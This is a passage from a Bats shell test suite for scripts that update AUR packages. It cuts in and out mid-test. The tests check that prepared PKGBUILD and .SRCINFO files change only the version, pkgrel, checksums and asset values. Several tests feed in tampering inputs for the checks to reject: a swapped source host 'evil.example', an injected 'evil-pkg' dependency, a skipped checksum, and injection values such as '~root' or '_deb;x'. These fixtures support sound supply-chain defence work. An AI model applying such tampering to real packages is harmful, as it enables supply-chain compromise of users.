  write_srcinfo_arch "$TEST_TMPDIR/new.SRCINFO" 1.1.0 demo-20261016.tar.gz SKIP "$H3"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
}

@test "check_prepared_srcinfo: rejects an added dependency" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 "$H3" "$H4"
  sed -i $'s/^\tlicense = MIT$/\tlicense = MIT\\n\tdepends = evil-pkg/' "$TEST_TMPDIR/new.SRCINFO"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO adds or removes lines"* ]]
}

# haskell-haxml: an older makepkg ended .SRCINFO with a blank line
@test "check_prepared_srcinfo: accepts an AUR copy that ends in a blank line" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  echo >>"$TEST_TMPDIR/old.SRCINFO"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 "$H3" "$H4"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: accepts a prepared copy that ends in blank lines" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 "$H3" "$H4"
  printf '\n\n' >>"$TEST_TMPDIR/new.SRCINFO"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: rejects a blank line added inside" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 "$H3" "$H4"
  sed -i $'s/^\tlicense = MIT$/\tlicense = MIT\\n/' "$TEST_TMPDIR/new.SRCINFO"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO adds or removes lines"* ]]
}

@test "check_prepared_srcinfo: rejects a line with another key than the AUR copy" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 "$H3" "$H4"
  sed -i $'s/^\tsha256sums = '"$H4"'$/\tb2sums = '"$H4"'/' "$TEST_TMPDIR/new.SRCINFO"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO line 11 has another key than the AUR copy: "$'\t'"b2sums = $H4"* ]]
}

# A .SRCINFO without pkgver gives no old version, and the empty string
# matches at every position
@test "_bump_version: keeps the line without an old version" {
  run _bump_version "source = https://example.com/demo-1.0.0.tar.gz" "" 1.1.0
  [ "$status" -eq 0 ]
  [ "$output" = "source = https://example.com/demo-1.0.0.tar.gz" ]
}

@test "check_prepared_srcinfo: rejects a line turned into an unknown checksum key" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 "$H3" "$H4"
  sed -i $'s/^\tlicense = MIT$/\tlicensesums = abc/' "$TEST_TMPDIR/new.SRCINFO"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 7 changes more than the version"* ]]
}

@test "check_prepared_srcinfo: rejects a source change beyond the version" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 "$H3" "$H4"
  sed -i 's|https://example.com/demo|https://evil.example/demo|' "$TEST_TMPDIR/new.SRCINFO"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 8 is not the AUR source with the new version"* ]]
}

@test "check_prepared_srcinfo: rejects a SKIP where the AUR had a hash" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 "SKIP" "$H4"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 10 is not a checksum matching the AUR copy"* ]]
}

@test "check_prepared_srcinfo: rejects when the files cannot be read" {
  run check_prepared_srcinfo "$TEST_TMPDIR/missing-old.SRCINFO" "$TEST_TMPDIR/missing-new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Could not read"* ]]
}

@test "check_prepared_srcinfo: rejects a pkgver other than the expected version" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.2.0 1 "$H3" "$H4"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO has pkgver = 1.2.0, expected 1.1.0"* ]]
}

@test "check_prepared_srcinfo: rejects a pkgrel other than 1" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 2 "$H3" "$H4"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO has pkgrel = 2, expected 1"* ]]
}

@test "check_prepared_files: refuses a PKGBUILD of the AUR repo that is a symlink" {
  mkdir "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared"
  write_pkgbuild "$TEST_TMPDIR/aur-PKGBUILD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  ln -s "$TEST_TMPDIR/aur-PKGBUILD" "$TEST_TMPDIR/aur/PKGBUILD"
  write_srcinfo "$TEST_TMPDIR/aur/.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_pkgbuild "$TEST_TMPDIR/prepared/PKGBUILD" 1.1.0 1 "sha256sums=('$H3' '$H4')"
  write_srcinfo "$TEST_TMPDIR/prepared/.SRCINFO" 1.1.0 1 "$H3" "$H4"
  run check_prepared_files "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"PKGBUILD in the AUR repo is missing, a symlink or not a regular file"* ]]
}

# === values from release asset names ===

# Values of _deb, the part of a liquidsoap asset name past the package
# name: two builds of 2.4.6 and the build of 2.5.0-rc1
V246_2=2.4.6-debian-forky-ocaml5.4.0-2
V246_3=2.4.6-debian-forky-ocaml5.4.0-3
V250=2.5.0-debian-forky-ocaml5.5.1-1

# Helper: PKGBUILD of a package that takes the name of its download from
# _deb, as liquidsoap-bin does
# Usage: write_asset_pkgbuild <path> <pkgver> <_deb> <pkgrel> <sha256sum>
write_asset_pkgbuild() {
  cat >"$1" <<EOF
pkgname=demo
pkgver=$2
_deb=$3
pkgrel=$4
pkgdesc="demo"
arch=('x86_64')
url="https://example.com"
license=('MIT')
_tag="v\${pkgver/rc/-rc}"
source=("https://example.com/download/\${_tag}/demo_\${_deb}_amd64.deb")
sha256sums=('$5')

package() {
  :
}
EOF
}

# Helper: the .SRCINFO makepkg prints for that PKGBUILD
# Usage: write_asset_srcinfo <path> <pkgver> <pkgrel> <_deb> <sha256sum>
write_asset_srcinfo() {
  printf '%s\n' "pkgbase = demo" $'\tpkgver = '"$2" $'\tpkgrel = '"$3" \
    $'\tsource = https://example.com/download/v'"${2/rc/-rc}/demo_$4"'_amd64.deb' \
    $'\tsha256sums = '"$5" "" "pkgname = demo" >"$1"
}

@test "_bumped_line: refuses a prepared line that lacks the new asset value" {
  run _bumped_line "a${V246_2}a" "a" 2.4.6 2.4.6 "" "" drop "$V246_2" "$V246_3"
  [ "$status" -eq 1 ]
}

@test "check_prepared_pkgbuild: accepts the asset value of the check run" {
  write_asset_pkgbuild "$OLD" 2.4.6 "$V246_3" 1 "$H1"
  write_asset_pkgbuild "$NEW" 2.5.0rc1 "$V250" 1 "$H2"
  run check_prepared_pkgbuild "$OLD" "$NEW" 2.5.0rc1 1 _deb "$V250"
  [ "$status" -eq 0 ]
}

@test "check_prepared_pkgbuild: rejects another asset value" {
  write_asset_pkgbuild "$OLD" 2.4.6 "$V246_3" 1 "$H1"
  write_asset_pkgbuild "$NEW" 2.5.0rc1 "$V250" 1 "$H2"
  run check_prepared_pkgbuild "$OLD" "$NEW" 2.5.0rc1 1 _deb "${V250%-1}-2"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD has _deb=${V250}, expected ${V250%-1}-2"* ]]
}

@test "check_prepared_pkgbuild: rejects a PKGBUILD without the asset line" {
  write_pkgbuild "$OLD" 1.0.0 1 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0 1 _deb "$V250"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD needs one _deb= line, it has 0"* ]]
}

@test "check_prepared_pkgbuild: rejects a second asset line" {
  write_asset_pkgbuild "$OLD" 2.4.6 "$V246_3" 1 "$H1"
  write_asset_pkgbuild "$NEW" 2.5.0rc1 "$V250" 1 "$H2"
  sed -i "/^_deb=/a _deb=$V246_3" "$OLD"
  sed -i "/^_deb=/a _deb=$V250" "$NEW"
  run check_prepared_pkgbuild "$OLD" "$NEW" 2.5.0rc1 1 _deb "$V250"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD needs one _deb= line, it has 2"* ]]
}

@test "check_prepared_pkgbuild: counts only a line that starts with the asset_var" {
  write_asset_pkgbuild "$OLD" 2.4.6 "$V246_3" 1 "$H1"
  write_asset_pkgbuild "$NEW" 2.5.0rc1 "$V250" 1 "$H2"
  sed -i 's/^  :$/  local _deb=x/' "$OLD" "$NEW"
  run check_prepared_pkgbuild "$OLD" "$NEW" 2.5.0rc1 1 _deb "$V250"
  [ "$status" -eq 0 ]
}

@test "check_prepared_pkgbuild: accepts the pkgrel it is given" {
  write_asset_pkgbuild "$OLD" 2.4.6 "$V246_2" 1 "$H1"
  write_asset_pkgbuild "$NEW" 2.4.6 "$V246_3" 2 "$H2"
  run check_prepared_pkgbuild "$OLD" "$NEW" 2.4.6 2 _deb "$V246_3"
  [ "$status" -eq 0 ]
}

@test "check_prepared_pkgbuild: rejects a pkgrel other than the one it is given" {
  write_asset_pkgbuild "$OLD" 2.4.6 "$V246_2" 1 "$H1"
  write_asset_pkgbuild "$NEW" 2.4.6 "$V246_3" 1 "$H2"
  run check_prepared_pkgbuild "$OLD" "$NEW" 2.4.6 2 _deb "$V246_3"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD has pkgrel=1, expected 2"* ]]
}

@test "check_prepared_srcinfo: accepts a source with the new asset value" {
  write_asset_srcinfo "$TEST_TMPDIR/old.SRCINFO" 2.4.6 1 "$V246_3" "$H1"
  write_asset_srcinfo "$TEST_TMPDIR/new.SRCINFO" 2.5.0 1 "$V250" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0 "" "" 1 "$V246_3" "$V250"
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: rejects a source with another asset value" {
  write_asset_srcinfo "$TEST_TMPDIR/old.SRCINFO" 2.4.6 1 "$V246_3" "$H1"
  write_asset_srcinfo "$TEST_TMPDIR/new.SRCINFO" 2.5.0 1 "${V250%-1}-2" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0 "" "" 1 "$V246_3" "$V250"
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 4 is not the AUR source with the new version"* ]]
}

# The tag of 2.5.0rc1 is v2.5.0-rc1, and its asset name holds no rc
@test "check_prepared_srcinfo: accepts the asset value of an rc with pkgver_dash ''" {
  write_asset_srcinfo "$TEST_TMPDIR/old.SRCINFO" 2.4.6 1 "$V246_3" "$H1"
  write_asset_srcinfo "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc1 1 "$V250" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc1 drop "" 1 "$V246_3" "$V250"
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: accepts an asset value that holds the version with a dash" {
  write_asset_srcinfo "$TEST_TMPDIR/old.SRCINFO" 2.4.6 1 2.4.6-build3 "$H1"
  write_asset_srcinfo "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc1 1 2.5.0-rc1-build1 "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc1 drop "" 1 2.4.6-build3 2.5.0-rc1-build1
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: rejects an asset value the AUR line does not hold" {
  write_asset_srcinfo "$TEST_TMPDIR/old.SRCINFO" 2.4.6 1 2.4.6-build3 "$H1"
  write_asset_srcinfo "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc1 1 2.5.0-rc1-build1 "$H2"
  sed -i 's|_amd64.deb$|_amd64.deb/2.5.0-rc1-build1|' "$TEST_TMPDIR/new.SRCINFO"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc1 drop "" 1 2.4.6-build3 2.5.0-rc1-build1
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 4 is not the AUR source with the new version"* ]]
}

@test "check_prepared_srcinfo: accepts another line with the new asset value" {
  write_asset_srcinfo "$TEST_TMPDIR/old.SRCINFO" 2.4.6 1 "$V246_3" "$H1"
  write_asset_srcinfo "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc1 1 "$V250" "$H2"
  sed -i $'/^\tsource = /a \tnoextract = demo_'"${V246_3}"'_amd64.deb' "$TEST_TMPDIR/old.SRCINFO"
  sed -i $'/^\tsource = /a \tnoextract = demo_'"${V250}"'_amd64.deb' "$TEST_TMPDIR/new.SRCINFO"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc1 drop "" 1 "$V246_3" "$V250"
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: accepts the pkgrel it is given" {
  write_asset_srcinfo "$TEST_TMPDIR/old.SRCINFO" 2.4.6 1 "$V246_2" "$H1"
  write_asset_srcinfo "$TEST_TMPDIR/new.SRCINFO" 2.4.6 2 "$V246_3" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.4.6 "" "" 2 "$V246_2" "$V246_3"
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: rejects a pkgrel other than the one it is given" {
  write_asset_srcinfo "$TEST_TMPDIR/old.SRCINFO" 2.4.6 1 "$V246_2" "$H1"
  write_asset_srcinfo "$TEST_TMPDIR/new.SRCINFO" 2.4.6 1 "$V246_3" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.4.6 "" "" 2 "$V246_2" "$V246_3"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO has pkgrel = 1, expected 2"* ]]
}

@test "check_prepared_srcinfo: rejects a new asset value that reaches no source" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 1 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.0.0 2 "$H1" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.0.0 "" "" 2 "$V246_2" "$V246_3"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO changes no source URL and no checksum, so the new asset value reaches no source"* ]]
}

@test "check_prepared_srcinfo: accepts the AUR copy with its asset value" {
  write_asset_srcinfo "$TEST_TMPDIR/old.SRCINFO" 2.4.6 2 "$V246_3" "$H1"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/old.SRCINFO" 2.4.6 "" "" 2 "$V246_3" "$V246_3"
  [ "$status" -eq 0 ]
}

# Helper: the AUR copy and the prepared update of the package of
# write_asset_pkgbuild, in $TEST_TMPDIR/aur and $TEST_TMPDIR/prepared
# Usage: write_asset_dirs <AUR pkgver> <AUR _deb> <AUR pkgrel> <pkgver> <_deb> <pkgrel>
write_asset_dirs() {
  mkdir -p "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared"
  write_asset_pkgbuild "$TEST_TMPDIR/aur/PKGBUILD" "$1" "$2" "$3" "$H1"
  write_asset_srcinfo "$TEST_TMPDIR/aur/.SRCINFO" "$1" "$3" "$2" "$H1"
  write_asset_pkgbuild "$TEST_TMPDIR/prepared/PKGBUILD" "$4" "$5" "$6" "$H2"
  write_asset_srcinfo "$TEST_TMPDIR/prepared/.SRCINFO" "$4" "$6" "$5" "$H2"
}

@test "check_prepared_files: takes the AUR pkgrel plus one for a rebuild" {
  write_asset_dirs 2.4.6 "$V246_2" 1 2.4.6 "$V246_3" 2
  run check_prepared_files "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared" 2.4.6 drop "" _deb "$V246_3"
  [ "$status" -eq 0 ]
}

@test "check_prepared_files: takes the AUR pkgrel plus one for a rebuild of a quoted pkgver" {
  write_asset_dirs 2.4.6 "$V246_2" 1 2.4.6 "$V246_3" 2
  sed -i -e 's/^pkgver=.*/pkgver="2.4.6"/' -e "s/^pkgrel=.*/pkgrel='1'/" "$TEST_TMPDIR/aur/PKGBUILD"
  run check_prepared_files "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared" 2.4.6 drop "" _deb "$V246_3"
  [ "$status" -eq 0 ]
}

@test "check_prepared_files: rejects a rebuild that keeps pkgrel" {
  write_asset_dirs 2.4.6 "$V246_2" 1 2.4.6 "$V246_3" 1
  run check_prepared_files "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared" 2.4.6 drop "" _deb "$V246_3"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD has pkgrel=1, expected 2"* ]]
}

@test "check_prepared_files: rejects a rebuild two pkgrel ahead" {
  write_asset_dirs 2.4.6 "$V246_2" 1 2.4.6 "$V246_3" 3
  run check_prepared_files "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared" 2.4.6 drop "" _deb "$V246_3"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD has pkgrel=3, expected 2"* ]]
}

@test "check_prepared_files: keeps the AUR pkgrel when the AUR has the asset value" {
  write_asset_dirs 2.4.6 "$V246_3" 2 2.4.6 "$V246_3" 2
  run check_prepared_files "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared" 2.4.6 drop "" _deb "$V246_3"
  [ "$status" -eq 0 ]
}

@test "check_prepared_files: takes pkgrel 1 for a new version" {
  write_asset_dirs 2.4.6 "$V246_3" 2 2.5.0rc1 "$V250" 3
  run check_prepared_files "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared" 2.5.0rc1 drop "" _deb "$V250"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD has pkgrel=3, expected 1"* ]]
}

@test "check_prepared_files: refuses an AUR PKGBUILD without the asset line" {
  write_asset_dirs 2.4.6 "$V246_3" 1 2.5.0rc1 "$V250" 1
  sed -i '/^_deb=/d' "$TEST_TMPDIR/aur/PKGBUILD"
  run check_prepared_files "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared" 2.5.0rc1 drop "" _deb "$V250"
  [ "$status" -eq 1 ]
  [[ "$output" == *"AUR PKGBUILD needs one _deb= line, it has 0"* ]]
}

@test "check_prepared_files: refuses a quoted asset value in the AUR PKGBUILD" {
  write_asset_dirs 2.4.6 "$V246_3" 1 2.5.0rc1 "$V250" 1
  sed -i "s/^_deb=.*/_deb=\"$V246_3\"/" "$TEST_TMPDIR/aur/PKGBUILD"
  run check_prepared_files "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared" 2.5.0rc1 drop "" _deb "$V250"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Asset value rejected"* ]]
}

@test "check_prepared_files: refuses a rebuild of a pkgrel that is no integer" {
  write_asset_dirs 2.4.6 "$V246_2" 1.1 2.4.6 "$V246_3" 2
  run check_prepared_files "$TEST_TMPDIR/aur" "$TEST_TMPDIR/prepared" 2.4.6 drop "" _deb "$V246_3"
  [ "$status" -eq 1 ]
  [[ "$output" == *"A rebuild needs an integer pkgrel in the AUR PKGBUILD, it has 1.1"* ]]
}

# Helper: the AUR at <old pkgver> with <old _deb> and <old pkgrel> for the
# package of write_asset_pkgbuild, its YAML with asset_var and
# pkgver_dash: '', and the .SRCINFO makepkg prints for <pkgver>, <_deb>
# and <pkgrel>. Sets OLD_SUM and NEW_SUM, the checksums of the two
# downloads.
# Usage: setup_asset_package <old pkgver> <old _deb> <old pkgrel> <pkgver> <_deb> <pkgrel>
setup_asset_package() {
  create_test_package "demo" "github-tag" "upstream:
  project: owner/repo
  asset_var: _deb
current: '$1'
current_asset: '$2'
pkgver_dash: ''"
  OLD_SUM=$(printf 'source of %s\n' "https://example.com/download/v${1/rc/-rc}/demo_${2}_amd64.deb" | sha256sum | cut -d' ' -f1)
  NEW_SUM=$(printf 'source of %s\n' "https://example.com/download/v${4/rc/-rc}/demo_${5}_amd64.deb" | sha256sum | cut -d' ' -f1)
  write_asset_pkgbuild "$OLD" "$1" "$2" "$3" "$OLD_SUM"
  write_asset_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$1" "$3" "$2" "$OLD_SUM"
  write_asset_srcinfo "$TEST_TMPDIR/new.SRCINFO" "$4" "$6" "$5" "$NEW_SUM"
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools "$TEST_TMPDIR/new.SRCINFO"
  mock_source_tools
  printf '#!/usr/bin/env bash\nsed -i s/%s/%s/ PKGBUILD\n' "$OLD_SUM" "$NEW_SUM" >"$MOCK_DIR/updpkgsums"
}

@test "a package with an asset value goes through prepare, verify and publish" {
  setup_asset_package 2.4.6 "$V246_3" 1 2.5.0rc1 "$V250" 1
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.5.0rc1 --asset "$V250" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  grep -qx "_deb=$V250" "$TEST_TMPDIR/out/demo/PKGBUILD"
  mock_downloads
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 0 ]
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 2.5.0rc1 "$TEST_TMPDIR/out/demo" --asset "$V250"
  [ "$status" -eq 0 ]
  [ "$(git -C "$AUR_REMOTE" show HEAD:.SRCINFO)" = "$(cat "$TEST_TMPDIR/new.SRCINFO")" ]
  [ "$(git -C "$AUR_REMOTE" log -1 --format=%s)" = "2.5.0rc1 release from github-tag" ]
  [ "$(yq -r .current "$TEST_TMPDIR/packages/demo.yml")" = "2.5.0rc1" ]
  [ "$(yq -r .current_asset "$TEST_TMPDIR/packages/demo.yml")" = "$V250" ]
}

@test "a rebuild goes through prepare, verify and publish" {
  setup_asset_package 2.4.6 "$V246_2" 1 2.4.6 "$V246_3" 2
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.4.6 --asset "$V246_3" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  grep -qx "pkgrel=2" "$TEST_TMPDIR/out/demo/PKGBUILD"
  mock_downloads
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 0 ]
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 2.4.6 "$TEST_TMPDIR/out/demo" --asset "$V246_3"
  [ "$status" -eq 0 ]
  [ "$(git -C "$AUR_REMOTE" show HEAD:.SRCINFO)" = "$(cat "$TEST_TMPDIR/new.SRCINFO")" ]
  [ "$(git -C "$AUR_REMOTE" log -1 --format=%s)" = "2.4.6-2 release from github-tag" ]
  [ "$(yq -r .current_asset "$TEST_TMPDIR/packages/demo.yml")" = "$V246_3" ]
}

@test "update-pkg: pushes a rebuild with the next pkgrel" {
  setup_asset_package 2.4.6 "$V246_2" 3 2.4.6 "$V246_3" 4
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.4.6 --asset "$V246_3"
  [ "$status" -eq 0 ]
  git -C "$AUR_REMOTE" show HEAD:PKGBUILD | grep -qx "pkgrel=4"
  [ "$(git -C "$AUR_REMOTE" log -1 --format=%s)" = "2.4.6-4 release from github-tag" ]
  [ "$(yq -r .current_asset "$TEST_TMPDIR/packages/demo.yml")" = "$V246_3" ]
}

@test "update-pkg: writes current_asset when the AUR already has the asset value" {
  setup_asset_package 2.4.6 "$V246_3" 2 2.4.6 "$V246_3" 2
  yq -i ".current_asset = \"$V246_2\"" "$TEST_TMPDIR/packages/demo.yml"
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.4.6 --asset "$V246_3"
  [ "$status" -eq 2 ]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
  [ "$(yq -r .current_asset "$TEST_TMPDIR/packages/demo.yml")" = "$V246_3" ]
}

@test "update-pkg --prepare: hands over the AUR files when the AUR has the asset value" {
  setup_asset_package 2.4.6 "$V246_3" 2 2.4.6 "$V246_3" 2
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.4.6 --asset "$V246_3" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 2 ]
  cmp "$OLD" "$TEST_TMPDIR/out/demo/PKGBUILD"
}

@test "update-pkg: a package with asset_var needs --asset" {
  setup_asset_package 2.4.6 "$V246_3" 1 2.5.0rc1 "$V250" 1
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.5.0rc1
  [ "$status" -eq 1 ]
  [[ "$output" == *"upstream.asset_var is set, so --asset is needed"* ]]
}

@test "update-pkg: --asset needs upstream.asset_var" {
  create_test_package "demo" "github-release" "upstream:
  project: owner/repo"
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --asset "$V250"
  [ "$status" -eq 1 ]
  [[ "$output" == *"--asset needs upstream.asset_var"* ]]
}

@test "update-pkg: --asset needs a value" {
  create_test_package "demo" "github-release" "upstream:
  project: owner/repo"
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --asset
  [ "$status" -eq 1 ]
  [[ "$output" == *"--asset needs a value"* ]]
}

# bash expands a tilde at the start of an assignment: _deb=~root gives the
# home directory of root
@test "update-pkg: refuses an asset value that starts with a tilde" {
  setup_asset_package 2.4.6 "$V246_3" 1 2.5.0rc1 "$V250" 1
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.5.0rc1 --asset '~root'
  [ "$status" -eq 1 ]
  [[ "$output" == *"Asset value rejected"* ]]
  [ ! -e "$TEST_TMPDIR/clone-urls" ]
}

# sed and awk read the name as part of a pattern
@test "update-pkg: refuses an asset_var that is no name starting with _" {
  local var
  for var in '_deb;x' 'x;_deb'; do
    create_test_package "demo" "github-tag" "upstream:
  project: owner/repo
  asset_var: '$var'"
    run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --asset "$V250"
    [ "$status" -eq 1 ]
    [[ "$output" == *"upstream.asset_var must be a name that starts with _: '$var'"* ]]
  done
}

# sed takes a slash in the value for the end of its replacement
@test "update-pkg: refuses an asset value with a slash" {
  setup_asset_package 2.4.6 "$V246_3" 1 2.5.0rc1 "$V250" 1
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.5.0rc1 --asset "2.5.0/x"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Asset value rejected"* ]]
}

@test "publish-pkg: refuses another asset value than the one of the check run" {
  setup_asset_package 2.4.6 "$V246_3" 1 2.5.0rc1 "$V250" 1
  "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.5.0rc1 --asset "$V250" --prepare "$TEST_TMPDIR/out"
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 2.5.0rc1 "$TEST_TMPDIR/out/demo" --asset "${V250%-1}-2"
  [ "$status" -eq 1 ]
